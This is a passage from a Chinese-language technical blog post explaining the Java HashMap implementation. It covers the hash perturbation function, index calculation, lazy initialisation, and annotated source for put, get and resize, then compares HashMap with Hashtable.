在要将链表转为红黑树之前，再进行一次判断，若数组容量小于该值，则用resize扩容，放弃转为红黑树</span></span><br><span class="line"><span class="comment">// 意图：在建立Map的初期，放置过多键值对进入同一个数组下标中，而导致不必要的链表-&gt;红黑树的转化，此时扩容即可，可有效减少冲突</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MIN_TREEIFY_CAPACITY = <span class="number">64</span>;</span><br></pre></td></tr></table></figure><p>重点解释一下负载因子，HashMap不是在容量等于size的时候才扩容，而是在快接近size时候就提前扩容。负载因子就是决定提前到多大。负载因子越大表示散列表的装填程度越高，反之越小。<br>它默认是0.75，也可以在构造函数里自定义。<br>负载因子越大，散列表的数据越密集，空间利用率越大，key也越容易冲突化为链表/红黑树，查找效率低；<br>负载因子越小，散列表的数据越稀疏，对空间的利用越浪费，但key也越不容易冲突，查找效率高。系统默认负载因子为0.75，一般情况下我们是无需修改的。</p><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>HashMap是一个映射散列表，它存储的数据是键值对(key-value)。<br>JDK1.8前采用数组+链表/红黑树， Node&lt;K,V&gt;[] table数组中的每一个Node元素是一个链表的头结点。这样结合数组和链表的优点，查询效率是大O(1)。</p><p>构造函数如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> hash;</span><br><span class="line">        <span class="keyword">final</span> K key;</span><br><span class="line">        V value;</span><br><span class="line">        Node&lt;K,V&gt; next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><p>HashMap的位运算可以说是老*猪带胸罩，一套接一套的。</p><h3 id="第一套：扰动函数"><a href="#第一套：扰动函数" class="headerlink" title="第一套：扰动函数"></a>第一套：扰动函数</h3><p>HashMap不是直接使用key的hashcode，而是要做异或加工。<strong>目的是减少散列冲突,使元素能够更均匀的分布在数组中。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static final int hash(Object key) &#123;</span><br><span class="line">        int h;</span><br><span class="line">        return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>hashcode是一个int类型32位的数，h &gt;&gt;&gt; 16即把hashcode的高16位向右移动到低16位。然后将<strong>hashCode的高16位和低16位异或</strong>，异或混合过后<strong>高16位的特征也掺杂进低16位</strong>，让数字的每一位都参加了散列运算当中。就像下面一样（h代表原本hashcode）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">h:        <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">0000</span> <span class="number">1110</span> <span class="number">1010</span></span><br><span class="line">h&gt;&gt;<span class="number">16</span>:    <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span></span><br><span class="line">newh=h^h&gt;&gt;<span class="number">16</span>:<span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">0000</span> <span class="number">1111</span> <span class="number">0001</span> <span class="number">0101</span></span><br></pre></td></tr></table></figure><p>这样就混合了高位低位数据特征。此外，还有一个重要的原因，在后面使用（length - 1) &amp; hash算下标时，因为length必然是2的次幂，length-1的二进制看起来就是一堆0后面跟着一个1（这个在下面第三套也会提到），如果不做扰动，高位的hashcode大部分情况都用不上。</p><h3 id="第二套：key是如何hash出对应的数组下标？"><a href="#第二套：key是如何hash出对应的数组下标？" class="headerlink" title="第二套：key是如何hash出对应的数组下标？"></a>第二套：key是如何hash出对应的数组下标？</h3><p>hash出应的数组下标理所当然的做法就取余hashcode % length，但jdk用了更有效率的<strong>位操作(length - 1) &amp; hash</strong>来代替取余操作。</p><h3 id="第三套：为什么长度一定要是2的整次幂？"><a href="#第三套：为什么长度一定要是2的整次幂？" class="headerlink" title="第三套：为什么长度一定要是2的整次幂？"></a>第三套：为什么长度一定要是2的整次幂？</h3><p>只有当数组长度是2的整次幂的时候，<strong>(length - 1) &amp; hash才可以代替取余操作hash%length</strong> ，毕竟位运算比取余操作效率更高。当长度是2的整次幂时候，比如8的二进制是1000，肉眼看过去是“一个1后面跟着一堆0”，在减一后就变成了0111，肉眼看过去是”前面全是0后面全是1“。再<strong>和hash与运算出的结果不会超过数组长度，因为前面全是0，与的结果还是0。</strong></p><p>比如长度如果是16，h是上面扰动函数算出的hashcode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">length-<span class="number">1</span>:     <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">1111</span></span><br><span class="line">h:            <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">0000</span> <span class="number">1111</span> <span class="number">0001</span> <span class="number">0101</span></span><br><span class="line">(length-<span class="number">1</span>)&amp;h: <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0101</span></span><br></pre></td></tr></table></figure><p>假设有两个个key，他们的hashcode不同，分别为code1和code2code1和code2分别与“前面全是0后面全是1“二进制相与，结果一定不同。<strong>但是，如果code1和code2分别与一个“后面不一定是1“的二进制相与，结果有可能相同</strong>。</p><h2 id="lazy-load"><a href="#lazy-load" class="headerlink" title="lazy_load"></a>lazy_load</h2><p>HashMap是延迟加载，即构造函数不负责初始化，而是由resize（）扩容承担初始化的责任。</p><p>具体过程是：第一次调用put()方法判断数组是否为空，如果为空调用resize（）扩容方法初始化后再put（）。</p><h2 id="1-7链表插入区别"><a href="#1-7链表插入区别" class="headerlink" title="1.7链表插入区别"></a>1.7链表插入区别</h2><p>HashMap在jdk<strong>1.7中采用头插入法</strong>，在扩容时会改变链表中元素原本的顺序，以至于在并发场景下导致链表成环的问题。</p><p>而在jdk<strong>1.8中采用尾插入法</strong>，在扩容时会保持链表元素原本的顺序，就不会出现链表成环的问题了。</p><h1 id="重要方法源码分析"><a href="#重要方法源码分析" class="headerlink" title="重要方法源码分析"></a>重要方法源码分析</h1><h2 id="put"><a href="#put" class="headerlink" title="put()"></a>put()</h2><p>put方法主要由putVal方法实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> V <span class="title">putVal</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">boolean</span> onlyIfAbsent,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="keyword">boolean</span> evict)</span> </span>&#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, i;</span><br><span class="line">    <span class="comment">//判断HashMap有没有初始化</span></span><br><span class="line">        <span class="keyword">if</span> ((tab = table) == <span class="keyword">null</span> || (n = tab.length) == <span class="number">0</span>) <span class="comment">//jdk源码的风格 在判断语句赋值</span></span><br><span class="line">            n = (tab = resize()).length;</span><br><span class="line">    <span class="comment">//如果没有产生hash冲突</span></span><br><span class="line">        <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="keyword">null</span>)</span><br><span class="line">            <span class="comment">//直接在数组tab[i = (n - 1) &amp; hash]处新建一个结点</span></span><br><span class="line">            tab[i] = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            Node&lt;K,V&gt; e; K k;</span><br><span class="line">            <span class="comment">//发生了hash冲突，并且key相同，对结点进行更新</span></span><br><span class="line">           </span><br><span class="line">            <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">                ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k)))) <span class="comment">//HashMap允许为空，空值是不能直接判断相等的</span></span><br><span class="line">                e = p;</span><br><span class="line">            <span class="comment">//如果结点是树节点，就插入到红黑树中</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="keyword">this</span>, tab, hash, key, value);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//否则，则为链表，遍历查找</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> binCount = <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                    <span class="comment">//到链表尾也没有找到就在尾部插入一个新结点。</span></span><br><span class="line">                    <span class="keyword">if</span> ((e = p.next) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        p.next = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">                        <span class="comment">//注意添加之后链表长度若大于8的话，需将链表转为红黑树</span></span><br><span class="line">                        <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                            treeifyBin(tab, hash);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                        ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                        <span class="comment">//找到就跳出去更新结点的值</span></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    p = e;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">                V oldValue = e.value;</span><br><span class="line">                <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="keyword">null</span>)</span><br><span class="line">                    e.value = value;</span><br><span class="line">                afterNodeAccess(e);</span><br><span class="line">                <span class="keyword">return</span> oldValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ++modCount;</span><br><span class="line">        <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">            resize();</span><br><span class="line">        afterNodeInsertion(evict);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="put（）可能造成线程不安全的问题"><a href="#put（）可能造成线程不安全的问题" class="headerlink" title="put（）可能造成线程不安全的问题"></a>put（）可能造成线程不安全的问题</h3><ul><li>JDK8之前，并发put下可能造成死循环。原因是多线程下单链表的数据结构被破环，指向混乱，造成了链表成环。JDK 8中对HashMap做了大量优化，已经不存在这个问题。</li><li>并发put，有可能造成键值对的丢失，如果两个线程同时读取到当前node，在链表尾部插入，先插入的线程是无效的，会被后面的线程覆盖掉。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>判断HashMap有没有初始化，并赋值</li><li>如果没有产生hash冲突，直接在数组tab[i = (n - 1) &amp; hash]处新建一个结点；</li><li>否则，发生了hash冲突，此时key如果和头结点的key相同，找到要更新的结点，直接跳到最后去更新值</li><li>否则，如果数组下标中的类型是TreeNode，就插入到红黑树中</li><li>如果只是普通的链表，就在链表中查找，找到key相同的结点就跳出，到最后去更新值；到链表尾也没有找到就在尾部插入一个新结点。</li><li>判断此时链表长度若大于8的话，还需要将链表转为红黑树（注意在要将链表转为红黑树之前，再进行一次判断，若数组容量小于64，则用resize扩容，放弃转为红黑树）</li></ol><h2 id="get"><a href="#get" class="headerlink" title="get()"></a>get()</h2><p>get方法主要由getNode方法实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> Node&lt;K,V&gt; <span class="title">getNode</span><span class="params">(<span class="keyword">int</span> hash, Object key)</span> </span>&#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; <span class="keyword">int</span> n; K k;</span><br><span class="line">    <span class="comment">//判断HashMap有没有被初始化</span></span><br><span class="line">        <span class="keyword">if</span> ((tab = table) != <span class="keyword">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">            (first = tab[(n - <span class="number">1</span>) &amp; hash]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//数组下标的链表头就找到key相同的，那么返回链表头的值</span></span><br><span class="line">            <span class="keyword">if</span> (first.hash == hash &amp;&amp; <span class="comment">// always check first node</span></span><br><span class="line">                ((k = first.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                <span class="keyword">return</span> first;</span><br><span class="line">            <span class="keyword">if</span> ((e = first.next) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//如果数组下标处的类型是TreeNode，就在红黑树中查找</span></span><br><span class="line">                <span class="keyword">if</span> (first <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                    <span class="keyword">return</span> ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key);</span><br><span class="line">                <span class="comment">//在链表中遍历查找了</span></span><br><span class="line">                <span class="keyword">do</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                        ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                        <span class="keyword">return</span> e;</span><br><span class="line">                &#125; <span class="keyword">while</span> ((e = e.next) != <span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ol><li>如果在数组下标的链表头就找到key相同的，那么返回链表头的值</li><li>否则如果数组下标处的类型是TreeNode，就在红黑树中查找</li><li>否则就是在普通链表中查找了</li><li>都找不到就返回null</li></ol><p>remove方法的流程大致和get方法类似。</p><h2 id="resize"><a href="#resize" class="headerlink" title="resize()"></a>resize()</h2><p>扩容方法有这么一句<code>newCap = oldCap &lt;&lt; 1</code>说明是扩容后数组大小是原数组的两倍。</p><p>同时，该方法也承担了首次put值时，<strong>初始化数组</strong>的责任。</p><p>这个方法有点长，我将它分为三段分析。</p><p>下面三段在源码中是连在一起的一个方法，只是我这里为了逻辑清晰把它分开了。</p><p>第一段，准备好新数组，并做对数组的大小的进行判断，如果是初始化数组，基本工作在这一段就完成了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Node&lt;K,V&gt;[] resize() &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] oldTab = table;<span class="comment">//</span></span><br><span class="line">    <span class="keyword">int</span> oldCap = (oldTab == <span class="keyword">null</span>) ? <span class="number">0</span> : oldTab.length;</span><br><span class="line">    <span class="keyword">int</span> oldThr = threshold;</span><br><span class="line">    <span class="keyword">int</span> newCap, newThr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (oldCap &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//如果旧数组的长度已经达到最大容量了2^30</span></span><br><span class="line">        <span class="keyword">if</span> (oldCap &gt;= MAXIMUM_CAPACITY) &#123;</span><br><span class="line">            <span class="comment">//将阈值修改为int的最大值，不进行扩容直接返回旧数组</span></span><br><span class="line">            threshold = Integer.MAX_VALUE;</span><br><span class="line">            <span class="keyword">return</span> oldTab;</span><br><span class="line">        &#125;<span class="comment">//新长度是新长度的2倍之后新长度小于最大容量+旧长度大于初始化长度16</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((newCap = oldCap &lt;&lt; <span class="number">1</span>) &lt; MAXIMUM_CAPACITY &amp;&amp;</span><br><span class="line">                 oldCap &gt;= DEFAULT_INITIAL_CAPACITY)</span><br><span class="line">            <span class="comment">//阈值扩大一倍</span></span><br><span class="line">            newThr = oldThr &lt;&lt; <span class="number">1</span>; <span class="comment">// double threshold</span></span><br><span class="line">    &#125;<span class="comment">//这种情况是指定了初始容量，new HashMap（int initialCapacity），第一次put初始化的时候</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (oldThr &gt; <span class="number">0</span>) <span class="comment">// initial capacity was placed in threshold</span></span><br><span class="line">        newCap = oldThr;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">//这种情况是没指定初始容量，new HashMap（），第一次put初始化的时候      </span></span><br><span class="line">        <span class="comment">// zero initial threshold signifies using defaults</span></span><br><span class="line">        newCap = DEFAULT_INITIAL_CAPACITY;</span><br><span class="line">        newThr = (<span class="keyword">int</span>)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (newThr == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)newCap * loadFactor;</span><br><span class="line">        newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (<span class="keyword">float</span>)MAXIMUM_CAPACITY ?</span><br><span class="line">                  (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line">    threshold = newThr;</span><br><span class="line">    <span class="comment">//初始化新数组</span></span><br><span class="line">    Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[newCap];</span><br><span class="line">    <span class="comment">//如果是初始化，到这里就结束啦，直接跳到最后返回table新数组。</span></span><br><span class="line">    table = newTab;</span><br></pre></td></tr></table></figure><p>第二段，遍历原数组每一个结点，有三种情况：只有一个头结点、是红黑树、是链表。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (oldTab != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="comment">//遍历原数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; oldCap; ++j) &#123;</span><br><span class="line">        Node&lt;K,V&gt; e;</span><br><span class="line">        <span class="keyword">if</span> ((e = oldTab[j]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            oldTab[j] = <span class="keyword">null</span>;</span><br><span class="line">            <span class="comment">// 如果数组中只有一个元素，即只有一个头结点，重新哈希新下标就可以了</span></span><br><span class="line">            <span class="keyword">if</span> (e.next == <span class="keyword">null</span>)</span><br><span class="line">                newTab[e.hash &amp; (newCap - <span class="number">1</span>)] = e;</span><br><span class="line">            <span class="comment">//如果是一个树节点</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                ((TreeNode&lt;K,V&gt;)e).split(<span class="keyword">this</span>, newTab, j, oldCap);</span><br><span class="line">            <span class="keyword">else</span> &#123; <span class="comment">//否则就是链表，这种情况复制比较复杂，单独分一段讲</span></span><br></pre></td></tr></table></figure><p>第三段，链表的复制比较复杂。</p><ul><li>旧链表拆分成两个新链表。首先我们要明白，新数组的的长度是旧数组的两倍。也就是说<strong>旧数组的一个下标可以对应新数组的两个下标</strong>。比如就数组的下标是k，新数组的就对应k和k+oldCap两个下标。于是我们准备<strong>两个链表作为新数组的两个下标的结点</strong>，这里我叫这两个链表为A和B。</li><li>拆分的标准是e.hash &amp; oldCap == 0。这句其实就是<strong>取e的hashcode在长度范围内的最高位</strong>，其实最高位不外乎两种情况，1和0。但是怎么能取到在长度范围内的最高位呢——把它和长度做与就可得到。比如长度是4，与上e的hashcode得最高位为1。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashcode:<span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">0000</span> <span class="number">1111</span> <span class="number">0001</span> <span class="number">0101</span></span><br><span class="line">length:  <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0001</span> <span class="number">0000</span></span><br><span class="line">         <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0001</span> <span class="number">0000</span></span><br></pre></td></tr></table></figure><p>如果(e.hash &amp; oldCap) 等于0，则该节点在新、旧数组的下标都是k。</p><p>如果(e.hash &amp; oldCap) 不等于0，则该节点在新数组的下标是k+oldCap。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">           <span class="comment">//loHead指向lo链表的头，loTail指向lo链表尾                 </span></span><br><span class="line">                Node&lt;K,V&gt; loHead = <span class="keyword">null</span>, loTail = <span class="keyword">null</span>;</span><br><span class="line">           <span class="comment">//hiHead指向hi链表的头，hiTail指向hi链表尾     </span></span><br><span class="line">                Node&lt;K,V&gt; hiHead = <span class="keyword">null</span>, hiTail = <span class="keyword">null</span>;</span><br><span class="line">                Node&lt;K,V&gt; next;</span><br><span class="line">                <span class="keyword">do</span> &#123;</span><br><span class="line">                    next = e.next;</span><br><span class="line">                    <span class="comment">//(e.hash &amp; oldCap) == 0)哈希值最高位是0分到链表lo</span></span><br><span class="line">                    <span class="keyword">if</span> ((e.hash &amp; oldCap) == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (loTail == <span class="keyword">null</span>)</span><br><span class="line">                            loHead = e;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            loTail.next = e;</span><br><span class="line">                        loTail = e;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//否则分到链表hi</span></span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (hiTail == <span class="keyword">null</span>)</span><br><span class="line">                            hiHead = e;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            hiTail.next = e;</span><br><span class="line">                        hiTail = e;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">while</span> ((e = next) != <span class="keyword">null</span>);</span><br><span class="line">             <span class="comment">//如果lo链表不为空，loHead挂到新数组[原下标]处；</span></span><br><span class="line">                <span class="keyword">if</span> (loTail != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    loTail.next = <span class="keyword">null</span>;</span><br><span class="line">                    </span><br><span class="line">                    newTab[j] = loHead;</span><br><span class="line">                &#125;<span class="comment">//如果hi链表不为空，hiHead挂到新数组中[原下标+oldCap]处</span></span><br><span class="line">                <span class="keyword">if</span> (hiTail != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    hiTail.next = <span class="keyword">null</span>;</span><br><span class="line">                    </span><br><span class="line">                    newTab[j + oldCap] = hiHead;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> newTab;</span><br></pre></td></tr></table></figure><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><ol><li>如果数组未被初始化，就根据初始化值初始化数组</li><li>否则新生成一个长度是原来2倍的新数组，把所有元素复制到新数组</li><li>如果元素只有一个节点，复制到重新hash()计算的下标</li><li>如果是一个树节点，就对树进行复制</li><li>如果是链表，则新生成两个链表，一个挂在原下标位置，一个挂在原下标+原长度位置</li></ol><h1 id="其他相似的集合"><a href="#其他相似的集合" class="headerlink" title="其他相似的集合"></a>其他相似的集合</h1><h2 id="与HashTable"><a href="#与HashTable" class="headerlink" title="与HashTable"></a>与HashTable</h2><p>一、<strong>是否允许为空</strong>。HashMap可以允许存在<strong>一个</strong>为null的key和任意个为null的value，但是HashTable中的key和value都不允许为null。</p><p>当HashMap遇到为null的key时，它会调用putForNullKey方法来进行处理。value如果为空则抛出NullPointerException()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == <span class="keyword">null</span>)            <span class="keyword">return</span> putForNullKey(value);      而当HashTable遇到<span class="keyword">null</span>时，他会直接抛出NullPointerException异常信息。</span><br><span class="line"><span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;    <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br></pre></td></tr></table></figure><p>二、<strong>是否线程安全。</strong>Hashtable的方法是线程安全的，而HashMap的方法不是。</p><p>Hashtable的方法都是用synchronized修饰的，在修改数组时锁住整个Hashtable，<strong>这样的做法效率很低</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;...&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title">put</span><span class="params">(K key, V value)</span> 